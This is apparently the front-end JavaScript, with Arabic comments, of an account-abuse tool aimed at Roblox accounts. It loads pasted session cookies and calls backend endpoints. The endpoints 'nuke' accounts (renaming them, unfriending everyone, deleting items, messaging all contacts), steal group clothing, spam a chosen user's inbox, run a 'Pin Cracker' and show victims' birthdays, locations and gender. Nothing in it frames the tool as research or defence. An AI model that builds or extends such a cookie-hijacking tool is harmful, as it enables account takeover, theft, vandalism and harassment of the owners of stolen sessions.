// ===================== إدارة الـ Cookies =====================
let currentCookies = [];

// إضافة كوكي جديد
document.getElementById('addCookieBtn').addEventListener('click', async () => {
    const cookie = document.getElementById('cookieInput').value.trim();
    if (!cookie) {
        addLog('❌ الرجاء إدخال Cookie صالح', 'error');
        return;
    }

    addLog('🔄 جاري التحقق من الـ Cookie...', 'info');
    try {
        const response = await fetch('/api/add-cookie', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie })
        });
        const data = await response.json();
        if (data.success) {
            currentCookies.push({ cookie, user: data.user });
            updateCookiesList();
            addLog(`✅ تم إضافة Cookie الحساب: ${data.user.name}`, 'success');
            document.getElementById('cookieInput').value = '';
        } else {
            addLog(`❌ ${data.message}`, 'error');
        }
    } catch (error) {
        addLog(`❌ خطأ في الاتصال: ${error.message}`, 'error');
    }
});

// تحديث قائمة الكوكيز المعروضة
function updateCookiesList() {
    const listDiv = document.getElementById('cookiesList');
    if (currentCookies.length === 0) {
        listDiv.innerHTML = '<div style="margin-top:10px; color:#aaa;">لا توجد Cookies مضافة</div>';
        return;
    }
    listDiv.innerHTML = currentCookies.map((c, idx) => `
        <div class="cookie-item" style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px; background: #1E1F22; padding: 8px; border-radius: 8px;">
            <span>🍪 ${c.user.name} (${c.user.id})</span>
            <button class="remove-cookie" data-index="${idx}" style="background: #ED4245; padding: 5px 10px;">إزالة</button>
        </div>
    `).join('');

    // إضافة حدث الإزالة
    document.querySelectorAll('.remove-cookie').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const index = parseInt(btn.dataset.index);
            currentCookies.splice(index, 1);
            updateCookiesList();
            addLog('🗑️ تم إزالة Cookie', 'info');
        });
    });
}

// ===================== معلومات الحساب =====================
document.getElementById('refreshInfoBtn')?.addEventListener('click', async () => {
    if (currentCookies.length === 0) {
        addLog('❌ لا يوجد Cookies نشطة', 'error');
        return;
    }

    const infoDiv = document.getElementById('accountInfo');
    infoDiv.innerHTML = '<div class="loading">جاري التحميل...</div>';

    // نأخذ أول كوكي للعرض (يمكن تعديلها لعرض كل الكوكيز)
    const cookieData = currentCookies[0];
    try {
        const response = await fetch('/api/cookie-info', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie: cookieData.cookie })
        });
        if (response.ok) {
            const info = await response.json();
            infoDiv.innerHTML = `
                <div style="margin-top:10px;">
                    <h4>${info.name}</h4>
                    <p>🆔 المعرف: ${info.id}</p>
                    <p>💰 روبوكس: ${info.robux}</p>
                    <p>📍 الموقع: ${info.location}</p>
                    <p>🎂 تاريخ الميلاد: ${info.birthday}</p>
                    <p>⚥ الجنس: ${info.gender}</p>
                    <p>🔒 PIN مفعل: ${info.pinEnabled ? 'نعم' : 'لا'}</p>
                    <p>📧 البريد مؤكد: ${info.emailVerified ? 'نعم' : 'لا'}</p>
                    <p>🪪 التحقق العمري: ${info.ageVerified ? 'نعم' : 'لا'}</p>
                </div>
            `;
        } else {
            infoDiv.innerHTML = '<div style="color:#ED4245;">فشل في جلب المعلومات</div>';
        }
    } catch (error) {
        infoDiv.innerHTML = `<div style="color:#ED4245;">خطأ: ${error.message}</div>`;
    }
});

// ===================== دوال مساعدة =====================
function addLog(message, type = 'info') {
    const logDiv = document.getElementById('logMessages');
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    logDiv.appendChild(entry);
    entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// تنفيذ طلب عام مع إظهار النتائج
async function executeAction(endpoint, data, successMsg, errorMsg) {
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return false;
    }
    addLog(`🔄 جاري تنفيذ: ${successMsg}...`, 'info');
    try {
        const response = await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        const result = await response.json();
        if (response.ok && result.success) {
            addLog(`✅ ${successMsg}`, 'success');
            return true;
        } else {
            addLog(`❌ ${errorMsg || result.message || 'فشل التنفيذ'}`, 'error');
            return false;
        }
    } catch (error) {
        addLog(`❌ خطأ: ${error.message}`, 'error');
        return false;
    }
}

// ===================== الأزرار الجماعية (Mass Actions) =====================
document.querySelectorAll('.mass-action').forEach(btn => {
    btn.addEventListener('click', async (e) => {
        const action = btn.dataset.action;
        if (!action) return;

        let endpoint = '';
        let data = { cookies: currentCookies.map(c => c.cookie) };

        switch (action) {
            case 'leave-groups':
                const groupIds = document.getElementById('massGroupIds')?.value;
                if (!groupIds) {
                    addLog('❌ أدخل معرفات المجموعات', 'error');
                    return;
                }
                data.groupIds = groupIds;
                endpoint = '/api/leave-groups';
                break;
            case 'unfavorite-games':
                endpoint = '/api/unfavorite-games';
                break;
            case 'unfollow-all':
                endpoint = '/api/unfollow-all';
                break;
            case 'unfriend-all':
                endpoint = '/api/unfriend-all';
                break;
            case 'delete-tshirts':
                endpoint = '/api/delete-tshirts';
                break;
            case 'delete-outfits':
                endpoint = '/api/delete-outfits';
                break;
            default:
                return;
        }

        await executeAction(endpoint, data, `تم تنفيذ ${action}`, `فشل تنفيذ ${action}`);
    });
});

// ===================== Nuke Actions =====================
document.querySelectorAll('.nuke-action').forEach(btn => {
    btn.addEventListener('click', async () => {
        const action = btn.dataset.action;
        if (!action) return;

        let value = null;
        switch (action) {
            case 'change-name':
                value = document.getElementById('nukeUsername')?.value;
                if (!value) { addLog('❌ أدخل الاسم الجديد', 'error'); return; }
                break;
            case 'change-description':
                value = document.getElementById('nukeDescription')?.value;
                if (!value) { addLog('❌ أدخل الوصف الجديد', 'error'); return; }
                break;
            case 'message-all':
                value = document.getElementById('messageAllText')?.value;
                if (!value) { addLog('❌ أدخل نص الرسالة', 'error'); return; }
                break;
            case 'change-game-names':
                value = document.getElementById('newGameName')?.value;
                if (!value) { addLog('❌ أدخل اسم اللعبة الجديد', 'error'); return; }
                break;
            case 'change-game-descriptions':
                value = document.getElementById('newGameDesc')?.value;
                if (!value) { addLog('❌ أدخل وصف اللعبة الجديد', 'error'); return; }
                break;
            default:
                break;
        }

        if (currentCookies.length === 0) {
            addLog('❌ أضف Cookie أولاً', 'error');
            return;
        }

        const data = {
            cookie: currentCookies[0].cookie,
            action: action,
            value: value
        };

        await executeAction('/api/nuke-account', data, `تم تنفيذ Nuke: ${action}`, `فشل Nuke: ${action}`);
    });
});

// ===================== سرقة الملابس =====================
document.getElementById('stealClothesBtn')?.addEventListener('click', async () => {
    const groupId = document.getElementById('stealGroupId').value;
    if (!groupId) {
        addLog('❌ أدخل معرف المجموعة', 'error');
        return;
    }
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return;
    }
    const data = {
        cookie: currentCookies[0].cookie,
        groupId: groupId
    };
    await executeAction('/api/steal-group-clothes', data, `تمت سرقة ملابس المجموعة ${groupId}`, 'فشلت سرقة الملابس');
});

// ===================== رفع الملابس =====================
document.getElementById('uploadClothesBtn')?.addEventListener('click', async () => {
    const fileInput = document.getElementById('uploadClothes');
    const files = fileInput.files;
    if (!files.length) {
        addLog('❌ اختر ملفات للرفع', 'error');
        return;
    }
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return;
    }

    const formData = new FormData();
    for (let i = 0; i < files.length; i++) {
        formData.append('clothes', files[i]);
    }
    formData.append('cookie', currentCookies[0].cookie);

    addLog(`🔄 جاري رفع ${files.length} قطعة...`, 'info');
    try {
        const response = await fetch('/api/upload-clothes', {
            method: 'POST',
            body: formData
        });
        const result = await response.json();
        if (response.ok && result.success) {
            addLog(`✅ تم رفع ${files.length} قطعة بنجاح`, 'success');
        } else {
            addLog(`❌ فشل الرفع: ${result.message}`, 'error');
        }
    } catch (error) {
        addLog(`❌ خطأ: ${error.message}`, 'error');
    }
});

// ===================== إنشاء Gamepasses جماعي =====================
document.getElementById('createGamepassesBtn')?.addEventListener('click', async () => {
    const count = document.getElementById('gamepassCount').value;
    if (!count || isNaN(count) || count < 1) {
        addLog('❌ أدخل عدداً صحيحاً للـ Gamepasses', 'error');
        return;
    }
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return;
    }
    const data = {
        cookie: currentCookies[0].cookie,
        count: parseInt(count)
    };
    await executeAction('/api/create-gamepasses', data, `تم إنشاء ${count} Gamepass`, 'فشل إنشاء Gamepasses');
});

// ===================== إيقاف بيع Gamepasses =====================
document.getElementById('offSaleGamepassesBtn')?.addEventListener('click', async () => {
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return;
    }
    await executeAction('/api/off-sale-gamepasses', { cookie: currentCookies[0].cookie }, 'تم إيقاف بيع Gamepasses', 'فشل إيقاف البيع');
});

// ===================== Pin Cracker =====================
document.getElementById('pinCrackerBtn')?.addEventListener('click', async () => {
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return;
    }
    await executeAction('/api/pin-cracker', { cookie: currentCookies[0].cookie }, 'تم العثور على PIN (تجريبي)', 'فشل كسر PIN');
});

// ===================== توزيع عشوائي للأفاتار =====================
document.getElementById('randomizeAvatarBtn')?.addEventListener('click', async () => {
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return;
    }
    await executeAction('/api/randomize-avatar', { cookie: currentCookies[0].cookie }, 'تم توزيع الأفاتار عشوائياً', 'فشل التوزيع');
});

// ===================== إنشاء أزياء جماعي =====================
document.getElementById('createOutfitsBtn')?.addEventListener('click', async () => {
    const count = document.getElementById('createOutfitsCount').value;
    if (!count || isNaN(count) || count < 1) {
        addLog('❌ أدخل عدداً صحيحاً للأزياء', 'error');
        return;
    }
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return;
    }
    const data = {
        cookie: currentCookies[0].cookie,
        count: parseInt(count)
    };
    await executeAction('/api/create-outfits', data, `تم إنشاء ${count} زي`, 'فشل إنشاء الأزياء');
});

// ===================== التحقق من معرف المجموعة =====================
document.getElementById('checkGroupIdBtn')?.addEventListener('click', async () => {
    const input = document.getElementById('checkGroupIdInput').value;
    if (!input) {
        addLog('❌ أدخل رابط أو معرف المجموعة', 'error');
        return;
    }
    addLog(`🔍 جاري التحقق من: ${input}`, 'info');
    try {
        const response = await fetch('/api/check-group-id', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ input })
        });
        const result = await response.json();
        const resultDiv = document.getElementById('groupInfoResult');
        if (response.ok && result.success) {
            resultDiv.innerHTML = `
                <div style="margin-top:10px; background:#1E1F22; padding:8px; border-radius:8px;">
                    <h4>${result.group.name}</h4>
                    <p>🆔 ID: ${result.group.id}</p>
                    <p>👥 الأعضاء: ${result.group.memberCount}</p>
                    <p>📝 الوصف: ${result.group.description || 'لا يوجد'}</p>
                </div>
            `;
            addLog(`✅ تم العثور على المجموعة: ${result.group.name}`, 'success');
        } else {
            resultDiv.innerHTML = `<div style="color:#ED4245;">${result.message || 'المجموعة غير موجودة'}</div>`;
            addLog(`❌ ${result.message || 'المجموعة غير موجودة'}`, 'error');
        }
    } catch (error) {
        addLog(`❌ خطأ: ${error.message}`, 'error');
    }
});

// ===================== Spam User Inbox =====================
document.getElementById('spamInboxBtn')?.addEventListener('click', async () => {
    const userId = document.getElementById('spamUserId').value;
    const message = document.getElementById('spamMessage').value;
    const count = document.getElementById('spamCount').value;
    if (!userId || !message || !count) {
        addLog('❌ املأ جميع الحقول (معرف المستخدم، الرسالة، العدد)', 'error');
        return;
    }
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return;
    }
    const data = {
        cookie: currentCookies[0].cookie,
        userId: parseInt(userId),
        message: message,
        count: parseInt(count)
    };
    await executeAction('/api/spam-inbox', data, `تم إرسال ${count} رسالة`, 'فشل إرسال الرسائل');
});

// ===================== إزالة القفل الجغرافي =====================
document.getElementById('unregionLockBtn')?.addEventListener('click', async () => {
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return;
    }
    await executeAction('/api/unregion-lock', { cookie: currentCookies[0].cookie }, 'تم إزالة القفل الجغرافي', 'فشل إزالة القفل');
});

// ===================== Auto Ally =====================
document.getElementById('autoAllyBtn')?.addEventListener('click', async () => {
    const groupId = document.getElementById('autoAllyGroupId').value;
    if (!groupId) {
        addLog('❌ أدخل معرف المجموعة للتحالف', 'error');
        return;
    }
    if (currentCookies.length === 0) {
        addLog('❌ أضف Cookie أولاً', 'error');
        return;
    }
    const data = {
        cookie: currentCookies[0].cookie,
        groupId: groupId
    };
    await executeAction('/api/auto-ally', data, 'تم إرسال طلب تحالف', 'فشل إرسال طلب التحالف');
});

// ===================== تبديل علامات التبويب =====================
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tabId = btn.dataset.tab;
        if (!tabId) return;
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(`${tabId}-tab`).classList.add('active');
    });
});

// ===================== رسالة ترحيب =====================
window.addEventListener('load', () => {
    addLog('✨ الأداة جاهزة. قم بإضافة Cookie للبدء.', 'info');
});
